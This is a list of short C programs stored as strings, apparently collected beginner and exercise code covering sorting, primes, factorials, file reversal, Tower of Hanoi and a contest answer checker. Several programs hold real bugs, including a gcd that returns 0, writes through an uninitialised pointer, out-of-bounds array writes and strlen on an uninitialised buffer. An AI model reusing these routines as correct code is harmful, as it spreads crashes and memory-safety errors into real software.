    "#include <stdio.h>\n#include <ctype.h>\n#include <stdlib.h>\n#include <string.h>\nvoid encodeNum(int number, char* str){\n int nums[10];\n int siz = 0;\n int strp = 0;\n if (number == 0){\n  strcpy(str, \")0)\");\n  return;\n }\n else if (number < 0){\n  strcpy(str, \")0\");\n  number*= -1;\n  strp+=2;\n }\n while (number != 0){\n  nums[siz] = number % 10;\n  number/= 10;\n  siz++;\n }\n for (int p = siz-1; p >= 0; p--){\n  if (nums[p] == 0){\n   str[strp] = ')';\n   strp++;\n  }\n  else{\n   for (int n = nums[p]; n > 0; n--){\n    str[strp] = '(';\n    strp++;\n   }\n  }\n  str[strp] = '9';\n  strp++;\n }\n str[strp-1] = '0';\n str[strp] = ')';\n return;\n}\nint decodeNum(char *numstr){\n int num = 0;\n int siz = strlen(numstr);\n for (int p = 0; p < siz; p++){\n  if (numstr[p] == '(')\n   num++;\n  else if (numstr[p] == '9')\n   num*= 10;\n }\n if (numstr[0] == ')' && numstr[1] == '0'){\n  num*= -1;\n }\n return num;\n}\nint main(int argc, char *argv[]){\n    if (argc < 3){\n  printf(\"HELLSMI Number Coder\\n\");\n  printf(\"Syntax: hncode <-e or -d> <value>\\n\");\n  return 0;\n }\n argv[1][1] = tolower(argv[1][1]);\n if (!strcmp(argv[1], \"-e\")){\n  int codnum = atoi(argv[2]);\n  char res[100] = {'\\0'};\n  encodeNum(codnum, res);\n  printf(\"HELLSMI number is: %s\\n\", res);\n }\n else if (!strcmp(argv[1], \"-d\")){\n  printf(\"Numder is: %d\\n\", decodeNum(argv[2]));\n }\n else{\n  printf(\"Incorrect mode!\\n\");\n }\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int num[5];\n    puts(\"~~ Ordenamiento de 5 n\u00fameros enteros de forma ascendente ~~\");\n    for(int i = 0; i < 5; i++){\n        puts(\"Ingrese un n\u00famero entero: \");\n        scanf(\"%i\", &num[i]);\n    }\n    for(int i = 4; i > 0; i--){\n        for(int j = 0; j < i; j++){\n            if(num[j+1] < num[j]){\n                int tem = num[j+1];\n                num[j+1] = num[j];\n                num[j] = tem;\n            }\n        }\n    }\n    printf(\"N\u00fameros ordenados de forma ascendente: \");\n    for(int i = 0; i < 5; i++){\n        printf(\"%i \",num[i]);\n    }\n    puts(\"\");\n    return 0;\n}",
    "#include<stdio.h>\nvoid blast(int timer){\n if(timer > 0){\n  printf(\"%d\",timer);\n  printf(\"\\n\");\n  blast(timer-1);\n }\n else if(timer ==0){\n  printf(\"Blastoff!\\n\");\n }\n}\nint main(){\n blast(10);\n return 0;\n}",
    "#include <math.h>\n#include <stdio.h>\n#include <stdlib.h>\nint main(void) {\n    double x = 1.454094e06;\n    int n = (int) round(x);\n    printf(\"%.5le -> %d\\n\", x, n);\n    x = 1.454094e10;\n    n = (int) round(x);\n    printf(\"%.5le -> %d\\n\", x, n);\n    return 0;\n}",
    "\n\n\n\n\n\n\nint printf(const char *, ...);\nint square(int x) {\n return x * x;\n}\n\nint main(void) {\n return printf(\"square=%d, %d, %d\\n\", square(2), square\n\n\n  (2),\n  2);\n}",
    "#include <unistd.h>\n#include <stdio.h>\nint region1(unsigned int n) {\n while (n>32 && n < 40)\n     n--;\n return n;\n}\nint region2(unsigned int n) {\n while (n > 100 && n < 108)\n  n--;\n return n;\n}\nint main(int argc, char * argv[]) {\n unsigned char buff[2];\n int bytes = read(0, buff, sizeof buff);\n if (buff[0] == 25 && ((buff[0] + buff[1])<65)) {\n     region1(buff[1]);\n }\n region2(buff[0]);\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n int cikolata, verilen;\n printf(\"Cikolata sayisini yaziniz: \");\n scanf(\"%d\", &cikolata);\n printf(\"Verilen sayisini yaziniz: \");\n scanf(\"%d\", &verilen);\n if (verilen > cikolata)\n {\n  printf(\"verilen cikolata cikolata sayisindan buyuk olamaz\");\n }\n else\n {\n  printf(\"%d\", cikolata - verilen);\n }\n}",
    "#include<stdio.h>\nint main()\n{\n float n,i,sum=0;\n printf(\"Enter value of n: \");\n scanf(\"%f\",&n);\n for(i=1.0;i<=n;i++)\n {\n  sum+=1/i;\n  if(i!=n)\n      printf(\"1/%.0f+\",i);\n  else\n      printf(\"1/%.0f=\",i);\n }\n printf(\"%.2f\\n\",sum);\n return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nchar* convert_2(int dec)\n{\n  char* s = malloc(sizeof(char)*42);\n  if (dec < 0) {\n    dec = 2147483648 + dec;\n    for (int i = 2; i < 41; i++) {\n    if (dec % 2 == 1) {\n      s[42 - i] = '1';\n    }\n    else {\n      s[42 - i] = '0';\n    }\n    dec /= 2;\n    if (i % 5 == 0) {\n      s[41 - i] = ' ';\n      i++;\n    }\n  }\n    s[2] = '1';\n  }\n  else {\n    for (int i = 2; i < 41; i++) {\n    if (dec % 2 == 1) {\n      s[42 - i] = '1';\n    }\n    else {\n      s[42 - i] = '0';\n    }\n    dec /= 2;\n    if (i % 5 == 0) {\n      s[41 - i] = ' ';\n      i++;\n    }\n  }\n  }\n  s[0] = '0';\n  s[1] = 'b';\n  s[41] = '\\0';\n return s;\n}\nint main() {\n int n;\n char * bin;\n printf(\"Enter the Decimal Number\\n\");\n scanf(\"%d\",&n);\n bin = convert_2(n);\n printf(\"The Binary Notation of %d is\\t %s \\n\", n, bin);\n free(bin);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nconst char *T1=\"A\";\nconst char *T2=\"B\";\nconst char *T3=\"C\";\nvoid Print_TOH(unsigned int,FILE*,const char*,const char*,const char*);\nint main()\n{\n    FILE* fp=fopen(\"toh_output.txt\",\"w\");\n    if(fp==((void*)0))\n    {\n        printf(\"ERROR: Failed to open file/File doesn't exist.\");\n        return -1;\n    }\n    unsigned int n=0;\n    printf(\"Enter the total number of disks:\");\n    scanf(\"%u\",&n);\n    Print_TOH(n,fp,T1,T2,T3);\n    fclose(fp);\n    return 0;\n}\nvoid Print_TOH(unsigned int n,FILE* FP,const char *a,const char* b,const char* c)\n{\n    if(n==1)\n    {\n        fprintf(FP,\"Disk 1: %s to %s\\n\",a,c);\n    }\n    else\n    {\n        Print_TOH(n-1,FP,a,c,b);\n        fprintf(FP,\"Disk %d: %s to %s\\n\",n,a,c);\n        Print_TOH(n-1,FP,b,a,c);\n    }\n    return;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\n#include <string.h>\nint main(void){\nint vetorUser[10], aux, aux2;\n    for(aux = 0; aux < 10; aux++){\n        printf(\"\\nDigite o elemento [%d]: \", aux);\n        scanf(\"%d\", &vetorUser[aux]);\n        }\n    for(aux = 0; aux < 10; aux++){\n        for(aux2 = aux + 1; aux2 < 10; aux2++){\n            if(vetorUser[aux] == vetorUser[aux2]){\n                printf(\"\\nO valor %d, se repete!\", vetorUser[aux]);\n            }\n            else{}\n        }\n    }\n    return(0);\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nstatic long int num_calls = 0;\nlong int exponentiation(long int base, long int exp, long int mod)\n{\n    num_calls++;\n    if (exp == 0)\n        return 1;\n    if (exp == 1)\n        return base % mod;\n    long int t = exponentiation(base, exp / 2, mod);\n    t = (t * t) % mod;\n    if (exp % 2 == 0)\n        return t;\n    else\n        return (t * (base % mod)) % mod;\n}\nint main()\n{\n    long int x;\n    x = exponentiation(23, 373, 747);\n    printf(\"Answer: %ld\\n\", x);\n    printf(\"Number of calls: %ld\\n\", num_calls);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\nFILE *fp;\nchar ch;\nint i,pos;\nfp=fopen(\"input.txt\",\"r\");\nif(fp==((void*)0))\n{\nprintf(\"File does not exist..\");\n}\nfseek(fp,0,(2));\npos=ftell(fp);\ni=0;\nwhile(i<pos)\n{\ni++;\nfseek(fp,-i,(2));\nch=fgetc(fp);\nprintf(\"%c\",ch);\n}\nreturn 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    printf(\"Enter any character: \");\n    printf(\"getchar != EOF: %d\\n\", getchar() != (-1));\n}",
    "#include<stdio.h>\n\nlong long gcd(long long a, long long b)\n{\n    if(a == 0)\n        return 0;\n    return gcd(b % a, a);\n}\nlong long EulerTotient_Brute(long long num)\n{\n    long long answer = 1;\n    for(long long i = 2; i < num; i++)\n    {\n        if(gcd(i, num) == 1)\n            answer++;\n        return answer;\n    }\n}\nlong long EulerTotient_ProductForm(long long num)\n{\n    long long answer = num;\n    for (long long i = 2; i * i <= num; i++)\n    {\n        if (num % i == 0)\n        {\n            while (num % i == 0)\n                num /= i;\n            answer = answer - (answer / i);\n        }\n    }\n    if (num > 1)\n        answer = answer-(answer / num);\n    return answer;\n}\nint main()\n{\n    long long num;\n    printf(\"Enter the number: \\n\");\n    scanf(\"%lld\", &num);\n    printf(\"Euler totient function value is: %lld\", EulerTotient_ProductForm(num));\n    return 0;\n}",
    "#include <stdio.h>\nint main (int argc, char **argv) {\n  int start = 0;\n  int end = 0;\n  printf(\"Enter start: \");\n  scanf(\"%d\", &start);\n  printf(\"Enter finish: \");\n  scanf(\"%d\", &end);\n  if (start % 10 == 0) {\n    printf(\"%d\\n\", start);\n  }\n  int working_number = (start / 10) + 1;\n  while (working_number <= end / 10) {\n    printf(\"%d\\n\", working_number * 10);\n    working_number = working_number + 1;\n  }\n  return 0;\n}",
    "#include <stdio.h>\n\nint main(int argc, char const *argv[]) {\n  int initialSecond, initialMinute, initialHour;\n  int durationInSeconds, initialTimeInSeconds, finalTimeInSeconds;\n  int finalSecond, finalMinute, finalHour;\n  printf(\"Insert the initial time of the experiment\");\n  printf(\"\\nInitial initialHour: \");\n  scanf(\"%d\", &initialHour);\n  printf(\"\\nInitial initialMinute: \");\n  scanf(\"%d\", &initialMinute);\n  printf(\"\\nInitial initialSecond: \");\n  scanf(\"%d\", &initialSecond);\n  printf(\"\\nInsert the duration of the experiment in seconds: \");\n  scanf(\"%d\", &durationInSeconds);\n  initialTimeInSeconds =\n      initialHour * 3600 + initialMinute * 60 + initialSecond;\n  finalTimeInSeconds = initialTimeInSeconds + durationInSeconds;\n  while (finalTimeInSeconds >= 86400) {\n    finalTimeInSeconds -= 86400;\n  }\n  finalMinute = finalTimeInSeconds / 60;\n  finalSecond = finalTimeInSeconds % 60;\n  finalHour = finalMinute / 60;\n  finalMinute %= 60;\n  printf(\"Experiment ended in %.2d:%.2d:%.2d\", finalHour, finalMinute,\n         finalSecond);\n  return 0;\n}",
    "#include<stdio.h>\nint main (){\n    int i, numero,factorial = 1;\n    printf(\"Digite un numero para hallar el factorial: \");\n    scanf(\"%i\",&numero);\n    for(i=1;i<=numero;i++){\n        factorial *= i;\n    }\n    printf(\"\\n El factorial del numero es: %i\",factorial);\n    return 0;\n}",
    "#include <stdio.h>\nint main (void) {\n printf(\"EOF value : %d\\n\", (-1));\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\nconst int num_alunos = 7;\nint notas[]={18,10,11,8,7,19,5};\nprintf(\"Este programa faz a media dos alunos e indica a maior e a menor nota .\\n\\n\");\n  float divisao;\n  int ll;\n  float acumulador = 0;\n  int maior = notas[0] ;\n  int menor = notas[0] ;\n  printf(\"notas: \");\n  for (ll = 0; ll < num_alunos; ll++)\n  {\n  printf(\"%d \", notas[ll]);\n  acumulador =acumulador + notas[ll];\n    if (maior < notas[ll])\n    {\n      maior = notas[ll];\n  }\n    if (menor > notas[ll])\n    {\n      menor = notas[ll];\n    }\n  }\n  divisao = acumulador / num_alunos;\n  printf(\"\\nmedia: %.1f - \",divisao);\n  printf(\"maior: %d - \" , maior);\n  printf(\"menor: %d\", menor );\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int n, i;\n    printf(\"Enter an integer: \");\n    scanf(\"%d\",&n);\n    for(i=1; i<=10; ++i)\n    {\n        printf(\"%d * %d = %d \\n\", n, i, n*i);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <locale.h>\n#include <math.h>\nint main()\n{\n      setlocale(6, \"pt-br\");\n      int o = 0;\n      float up = 1, dp = 1;\n      int i;\n      double soma = 0;\n      for (i = 0; i < 19; i++)\n      {\n            up = up + 2;\n            dp = dp * 2;\n            soma = soma + (up / dp);\n      }\n      soma = soma + 1;\n      printf(\"%.2lf\\n\", soma);\n      return 0;\n}",
    "#include <stdio.h>\nint print_list_content(int num);\nint print_list_content(int num)\n{\n    int list[num];\n    for (int i=0; i<num; i++)\n    {\n        list[i] = i;\n    }\n    for (int i=0; i<num; i++)\n    {\n        printf(\"%6d%c\", list[i], (i%10==9 || i==num-1) ? '\\n' : ' ');\n    }\n    return 0;\n}\nint main()\n{\n    print_list_content(100);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n#include <time.h>\nint main()\n{\n    int i,j,sqr,k ;\n    clock_t start,finish;\n    double total;\n    printf(\"2\\n3\\n\");\n    start = clock();\n    for(i=5;i<=1000;i = i+2)\n    {\n        k = 0;\n        sqr = sqrt(i);\n        for(j =2;j<=sqr;j++)\n        {\n            if(i%j == 0)\n            {\n            k++;\n            }\n        }\n        if(k == 0)\n        {\n            printf(\"%d\\n\",i);\n        }\n    }\n    finish = clock();\n    total = (double)(finish - start);\n    printf(\"the total time is %f seconds\",total);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int n,t,i;\n    scanf(\"%d\",&n);\n    t=n+1;\n    while(1)\n    {\n        int m;\n        for(i=2; i<=t; i++)\n        {\n            m=t%i;\n            if(m==0)\n                break;\n        }\n        if(i==t)\n            break;\n        t++;\n    }\n    printf(\"%d\",t);\n    return 0;\n}",
    "#include<stdio.h>\nint suma(int a, int b){\n    return a + b;\n}\nint main(){\n    char resultado=1;\n    for(int i = 0; i<100; i++){\n        resultado = suma(i,resultado);\n    }\n    printf(\"El resultado de la suma es: %d\\n\",resultado);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include<string.h>\n\nint main() {\n    int val, num = 2, arr[100000], index = 0;\n    printf(\"Enter the value of the first number: \");\n    scanf(\"%d\", &val);\n    while (num * num <= val) {\n        if (val % num) {\n            num += 1;\n        } else {\n            val = val / num;\n            arr[index] = num;\n            index += 1;\n        }\n    }\n    if (val > 1) {\n        arr[index] = val;\n    }\n    for (int i = 0 ; i <= index ; i++) {\n        printf(\"%d \\n\", arr[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <errno.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\nint main()\n{\n int fd;\n FILE* fptr;\n fd=open(\"file.txt\",(0x04000000));\n fptr=fdopen(fd,\"r\");\n if(((void*)0)==fptr){\n  perror(\"File open:\");\n  exit(-1);\n }\n fclose(fptr);\n return 0;\n}",
    "#include <stdio.h>\nlong count_characters(FILE *f){\n    fseek(f, -1, 2);\n    long last_pos = ftell(f);\n    last_pos++;\n    return last_pos;\n}\nint main(int argc, char * argv[]){\n    int i=0, cnt;\n    char ch, chars[256];\n    FILE *fp1;\n    if ((fp1 = fopen(argv[1], \"r\"))) {\n        cnt = count_characters(fp1);\n        fseek(fp1, -1, 2);\n        int temp_cnt = cnt;\n        while (temp_cnt) {\n            chars[i++] = fgetc(fp1);\n            fseek(fp1, -2, 1);\n            temp_cnt--;\n        }\n    } else {\n        return 0;\n    }\n    fp1 = fopen(argv[1], \"w\");\n    for (int i=0; i<cnt; i++)\n        putc(chars[i], fp1);\n    fclose(fp1);\n    return 0;\n}",
    "#include<stdio.h>\nvoid foo();\nint main()\n{\nprintf(\"hello world\\n\");\nfoo();\nreturn 0;\n}\nvoid foo(){\n   for(int i = 0; i < 5; i++)\n printf(\"%d\",i);\n   printf(\"\\n\");\n}",
    "#include <stdio.h>\nint main() {\n  float d = 0.0, s = 0.0;\n  int i;\n  for (i = 0; i < 100000000; i++) {\n    d = d + 1.0;\n    s = s + 1.0 / d;\n  }\n  printf(\"%d\\n\", (int) (1000000.0 * s));\n  return 0;\n}",
    "#include<stdio.h>\nint f(int n){int i,k=1;\nfor(i=2;i<=n/2;i++)\n{\nif(n%i==0)\n{k=0;break;}\n}\nif(k==1) return 1;\nif(k==0 )return 0;\n}\nint main()\n{\n int a,b;\n scanf(\"%d\",&a);\n b=a+1;\n while(f(b)!=1){b++;\n }\n printf(\"%d\",b);\n}",
    "int main() {\n    int arr[2];\n    *arr = 1;\n    *(arr + 1) = 2;\n    return *arr + *(arr + 1);\n}",
    "#include <stdio.h>\nint main(void)\n{\n   int blank_cnt = 0, c, digit_cnt = 0,\n         letter_cnt = 0, nl_cnt = 0, other_cnt = 0;\n   while ((c = getchar()) != (-1))\n      if (c == ' ')\n         ++blank_cnt;\n      else if (c >= '0' && c <= '9')\n         ++digit_cnt;\n      else if (c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z')\n         ++letter_cnt;\n      else if (c == '\\n')\n         ++nl_cnt;\n      else\n         ++other_cnt;\n   printf(\"%10s%10s%10s%10s%10s%10s\\n\\n\",\n      \"blanks\", \"digits\", \"letters\", \"lines\", \"others\", \"total\");\n   printf(\"%10d%10d%10d%10d%10d%10d\\n\\n\",\n      blank_cnt, digit_cnt, letter_cnt, nl_cnt, other_cnt,\n      blank_cnt + digit_cnt + letter_cnt + nl_cnt + other_cnt);\n   return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int n, c, d, a[100], b[100];\n  printf(\"Enter the number of elements in array\\n\");\n  scanf(\"%d\", &n);\n  printf(\"Enter array elements\\n\");\n  for (c = 0; c < n ; c++)\n    scanf(\"%d\", &a[c]);\n  for (c = n - 1, d = 0; c >= 0; c--, d++)\n    b[d] = a[c];\n  for (c = 0; c < n; c++)\n    a[c] = b[c];\n  printf(\"The array after reversal:\\n\");\n  for (c = 0; c < n; c++)\n    printf(\"%d\\n\", a[c]);\n  return 0;\n}",
    "#include<stdio.h>\n#include<stdint.h>\n#include<string.h>\nint main()\n{\n    uint8_t buff[10];\n    printf(\"The result of sizeof() operator is %lu\\n\",sizeof(buff));\n    printf(\"The result of sizeof() with char* casting operator is %lu\\n\",sizeof((char*)buff));\n    printf(\"The result of strlen() is %lu\\n\",strlen(buff));\n    printf(\"The result of strlen() with char* casting is %lu\\n\",strlen((char*)buff));\n    return 0;\n}",
    "#include <stdio.h>\n\n void ler_vetor(int vet[])\n {\n  int i;\n  printf(\"Digite seu vetor: \");\n  for (i=0; i<5; i++)\n  {\n   scanf(\"%d\", &vet[i]);\n  }\n }\n int verifica(int vetx[], int vety[])\n {\n  int cont, a, i, j;\n  cont=0;\n  a=0;\n  j=0;\n  while (a<5)\n  {\n   i=0;\n   while (i<5)\n   {\n    if (vetx[i]==vety[j])\n    {\n     j=j+1;\n     i=5;\n     cont=cont+1;\n    }\n    if (vetx[i]!=vety[j])\n    {\n     i=i+1;\n    }\n   }\n   a=a+1;\n  }\n  if (cont==5)\n  {\n   return 1;\n  }\n  else\n  {\n   return 0;\n  }\n }\n int checa(int vetx[], int vety[])\n {\n  int i, cont;\n  i=0;\n  cont=0;\n  while (i<5)\n  {\n   if (vetx[i]==vety[i])\n   {\n    cont=cont+1;\n   }\n   i=i+1;\n  }\n  if (cont==5)\n  {\n   return 1;\n  }\n  else\n  {\n   return 0;\n  }\n }\n int main()\n {\n  int vetv[5];\n  int vetw[5];\n  ler_vetor(vetv);\n  ler_vetor(vetw);\n  if (verifica(vetv, vetw)==1)\n  {\n   if (checa(vetv, vetw)==0)\n   {\n    printf(\"\u00c9 permuta\u00e7\u00e3o!!\\n\");\n   }\n   else\n   {\n    printf(\"N\u00e3o \u00e9 permuta\u00e7\u00e3o!\\n\");\n   }\n  }\n  else\n  {\n  printf(\"N\u00e3o \u00e9 permuta\u00e7\u00e3o!!\\n\");\n  }\n }",
    "#include<stdio.h>\nvoid mp(char s[],int n);\nint main()\n{\n char a[10];\n int i;\n for(i=0;i<10;i++)\n   scanf(\"%c\",&a[i]);\n mp(a,10);\n for(i=0;i<10;i++)\n   printf(\"%c\",a[i]);\n}\nvoid mp(char s[],int n)\n{\n int i,j;\n char t;\n for(i=0;i<n-1;i++)\n   for(j=0;j<n-i-1;j++)\n       if(s[j]>s[j+1])\n        {\n            t=s[j];\n         s[j]=s[j+1];\n      s[j+1]=t;\n  }\n}",
    "#include<stdio.h>\nint main(int argc, char const *argv[])\n{\n  int n,index[26],i,len,flag=0,k;\n  char s[100000],prev,a,b;\n  scanf(\"%s\",s);\n  for(i=0;i<26;i++) index[i]=0;\n  for(i=0;s[i]!=0;i++) index[s[i]-'a']+=1;\n  len=i;\n  k=i&1;\n  for(i=0;i<26;i++)\n  {\n    if(index[i]&1)\n    {\n      if(k==1)\n      {\n        flag++;\n        if(flag==2) break;\n      }\n      else\n      {\n        flag=2;\n        break;\n      }\n    }\n  }\n  if(flag==2) printf(\"NO\\n\");\n  else printf(\"YES\\n\");\n  return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int N, amount, totalSapos = 0, totalRatos = 0, totalCoelhos = 0, total = 0;\n    char tipo;\n    scanf(\"%d\", &N);\n    for(N; N > 0; N--) {\n        scanf(\"%d %c\", &amount, &tipo);\n        if (tipo == 'C') {\n            totalCoelhos += amount;\n        } else if (tipo == 'R') {\n            totalRatos += amount;\n        } else if (tipo == 'S') {\n            totalSapos += amount;\n        }\n    }\n    total = totalCoelhos + totalRatos + totalSapos;\n    printf(\"Total: %d cobaias\\n\", total);\n    printf(\"Total de coelhos: %d\\n\", totalCoelhos);\n    printf(\"Total de ratos: %d\\n\", totalRatos);\n    printf(\"Total de sapos: %d\\n\", totalSapos);\n    printf(\"Percentual de coelhos: %.2f \\%\\n\", 100.0 * totalCoelhos/total);\n    printf(\"Percentual de ratos: %.2f \\%\\n\", 100.0 * totalRatos/total);\n    printf(\"Percentual de sapos: %.2f \\%\\n\", 100.0 * totalSapos/total);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int num;\n    printf(\"Input an integer number: \");\n    scanf(\"%d\",&num);\n    switch(num%2)\n    {\n        case 0:\n            printf(\"%d is an EVEN number\\n\",num);\n            break;\n        case 1:\n            printf(\"%d is an ODD number\\n\",num);\n            break;\n    }\n    printf(\"\\n*\\n**\\n***\\n****\\n*****\\n******\\n*******\\n\");\n    printf(\"Hello world!\\n\");\n    printf(\"*******\\n******\\n*****\\n****\\n***\\n**\\n*\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char** argv) {\n  FILE* fileIn = fopen(argv[1], \"r\");\n  FILE* fileOut = fopen(argv[2], \"w\");\n  char c;\n  while ((c = fgetc(fileIn)) != (-1)) {\n    fputc(c, fileOut);\n  }\n  fflush(fileOut);\n  fclose(fileOut);\n  fclose(fileIn);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    char ch;\n    printf(\"Enter any character: \");\n    scanf(\"%c\", &ch);\n    if(ch >= 'A' && ch <= 'Z')\n    {\n        printf(\"'%c' is uppercase alphabet.\", ch);\n    }\n    else if(ch >= 'a' && ch <= 'z')\n    {\n        printf(\"'%c' is lowercase alphabet.\", ch);\n    }\n    else\n    {\n        printf(\"'%c' is not an alphabet.\", ch);\n    }\n    return 0;\n}",
    "void userfunction(int a, int _c,int d) {\n}\nint main(int argc, char* argv[]) {\n userfunction(1, 2, 1);\n userfunction(2, 3, 0);\n}",
    "int main() {\n  int x = 1;\n  if (x == 0) goto label;\n  return x;\n  label:\n  return x + 1;\n}",
    "#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\nint main(void)\n{\n  printf(\"%*s\", 6, \"hello\\n\");\n  printf(\"%*s\", 7, \"hello\\n\");\n  printf(\"%*s\", 8, \"hello\\n\");\n  printf(\"%*s\", 10, \"hello\\n\");\n  printf(\"%*s\", 15, \"hello\\n\");\n  int orderNum = 12;\n  char *fileNum;\n  sprintf(fileNum, \"%d\", orderNum);\n  char *dummy = \"Hello\";\n  char dum[81] = \" \";\n  strcat(dum, dummy);\n  printf(\"%s\\n\", dum);\n  strcat(fileNum, dum);\n  printf(\"WHAT --> %s\\n\", fileNum);\n  char *practice = \"1.3.1 Text\";\n  int lengthStr = strlen(practice);\n  printf(\"%d\\n\", lengthStr);\n  char label[81];\n  int i = 0;\n  printf(\"wink\\n\");\n  while (practice[i] != ' ')\n  {\n    label[i] = practice[i];\n    printf(\"hi\\n\");\n    i++;\n  }\n  label[i] = ' '; i++;\n  label[i] = '\\0';\n  printf(\"%s\\n\", label);\n  char newLabel[81];\n  int ord = 1;\n  sprintf(newLabel, \"%d\", ord);\n  newLabel[strlen(newLabel)] = ' ';\n  strcat(newLabel, \"why\");\n  printf(\"%s\\n\", newLabel); fflush((stdout));\n  int j = 0;\n  char *dummy2 = \"A string\";\n  printf(\"%c\\n\", dummy2[3]); fflush((stdout));\n  char newNewLabel[81];\n  printf(\"%d\\n\", strlen(dummy2));\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nvoid insertion_sort(int *v, int n, int (*cmp)(const void*, const void*));\nint intComparer(const void *a, const void *b);\nint main (void) {\n    int T, N, n;\n    int size;\n    int values[10000];\n    scanf(\"%d\", &T);\n    while (T-- > 0) {\n        scanf(\"%d\", &N);\n        size = 0;\n        while (N-- > 0) {\n            scanf(\"%d\", &n);\n            if (bsearch(&n, values, size, sizeof(int), intComparer) == ((void*)0)) {\n                values[size++] = n;\n                insertion_sort(values, size, intComparer);\n            }\n        }\n        printf(\"%d\\n\", size);\n    }\n    return 0;\n}\nvoid insertion_sort(int *v, int n, int (*cmp)(const void*, const void*)) {\n    int i, j, c;\n    for (i = 1; i < n; i++) {\n        for (j = i; j > 0 && cmp(&v[j - 1], &v[j]) > 0; j--) {\n            c = v[j];\n            v[j] = v[j - 1];\n            v[j - 1] = c;\n        }\n    }\n}\nint intComparer(const void *a, const void *b) {\n    const int *ibPtr = b;\n    const int *iaPtr = a;\n    return *iaPtr - *ibPtr;\n}",
    "#include<stdio.h>\nint main ()\n{\nint n,i,odds,num,mid;\nodds=0;\nscanf(\"%d\",&n);\nint arr[n-1];\n do{\n scanf(\"%d\",&num);\n if(num%2!=0){\n arr[odds]=num;\n odds++;\n }\n }while(odds<n);\nmid=n/2;\nfor(i=0; i<mid; i++)\n printf(\"%d\\n\", arr[i]-arr[n-1-i]);\n if(n%2==1) printf(\"%d\", arr[mid]);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{int i,zhong,ge,k,shu[100000]={0};\n scanf(\"%d\",&ge);\n for(i=1;i<=ge;i++){\n  scanf(\"%d\",&zhong);\n  shu[zhong]++;}\n scanf(\"%d\",&k);\n for(i=99999;;i--){\n  if(shu[i]!=0)\n  k--;\n  if(0==k){\n   printf(\"%d %d\",i,shu[i]);\n   break;\n  }\n }\n return 0;\n }",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <limits.h>\nint main(int argc, char *argv[]){\n int a[] = {10, 11, 7, 10, 6};\n int size = sizeof(a)/sizeof(a[0]);\n printf(\"\\n\");\n int i = 0, max = a[1] - a[0];\n for(int j = 1; j < size ; j++)\n {\n  if((a[j] - a[i]) > max)\n   max= a[j] - a[i];\n  if(a[j] < a[i])\n   i = j;\n }\n printf(\"\\n[When to buy] Day i is %d, price is %d\\n\", i, a[i]);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int i=1,j=2;\n i = i < j;\n i = i ==j;\n i = i !=j;\n return 0;\n}",
    "int main()\n{\n  for(int i = 0; i < 10; ++i)\n  {\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint Mildt[1001],M,L,n;\nint boxes[1001 +1001],sum;\nFILE *fi;\nint verify ( void )\n{\n  int nr,i,prev,box,msum;\n  if(fscanf(fi,\"%d\",&nr)!=1 || nr < 0 || nr > n)\n    return 0;\n  msum = 0;\n  prev=-1;\n  for(i=0;i<nr;i++)\n    {\n      if(fscanf(fi,\"%d\",&box)!=1 || box <= prev || box > n)\n return 0;\n      msum += boxes[box-1];\n      prev = box;\n    }\n  return (msum<=M && (sum-msum)<=L);\n}\nint main (void)\n{\n  int i,j;\n  char e,p[100];\n  freopen(\"shop.in\",\"rt\",(stdin));\n  if ( (fi = fopen(\"shop.out\",\"rt\")) == ((void*)0))\n    goto no;\n  while(scanf(\"%d%d\",&M,&L)==2 && (M||L))\n    {\n      scanf(\"%d\",&n);\n      memset(Mildt,0,sizeof(Mildt));\n      Mildt[0] = -1;\n      sum=0;\n      for(i=0;i<n;i++)\n {\n   scanf(\"%d\",boxes+i);\n   sum+=boxes[i];\n   for(j=M;j>=boxes[i];j--)\n     if (!Mildt[j] && Mildt[j-boxes[i]])\n       Mildt[j] = i+1;\n }\n      for(i=0;i<=M;i++)\n if(Mildt[i] && sum-i <= L)\n   break;\n      if(i>M)\n {\n   if(fscanf(fi,\" Impossible to distribut%c\",&e)!=1 || e!='e')\n     goto no;\n }\n      else\n {\n   if (!verify())\n     goto no;\n }\n    }\n  if(fscanf(fi,\" %c\",&e)==1)\n    goto no;\n  printf(\"\\n\\n\\nYes - Correct Answer!!!!\\n\\n\\n\");\n  return 0;\n no:\n  printf(\"\\n\\n\\nNo - Incorrect Output!!!!\\n\\n\\n\");\n  return 0;\n}",
    "#include <stdio.h>\nint main ()\n{\n    int a,b;\n    scanf(\"%d %d\",&a,&b);\n    printf(\"%d\\n%d\\n%d\\n%d\\n%d\\n\",a+b, a-b, a*b, a/b, a%b);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\nint run() {\nstatic int code[]={};\nstatic char stab[]={};\nstatic char data[]={};\nstatic int stack[10000];\nstatic const int _pc[]={};\nint *pc=code+0, *sp = stack+10000, *bp=sp, a, *t;\n}\nint main() {\n  run();\n}",
